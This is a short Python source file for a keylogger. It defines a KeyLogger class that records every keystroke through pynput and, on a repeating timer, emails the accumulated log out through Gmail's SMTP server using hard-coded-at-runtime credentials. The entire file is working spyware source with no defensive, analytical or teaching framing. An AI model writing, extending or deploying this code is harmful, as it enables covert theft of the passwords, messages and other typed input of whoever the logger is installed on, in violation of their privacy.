#!/usr/bin/env python
import pynput.keyboard as keyboard
import threading
import smtplib


class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def get_real_key_char(self, key):
        try:
            return key.char
        except AttributeError:
            return str(key).split(".")[1]

    def process_key_press(self, key):
        self.append_to_log(self.get_real_key_char(key) + " ")

    def report(self):
        self.send_mail()
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, "\n\n" + self.log)
        server.quit()

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


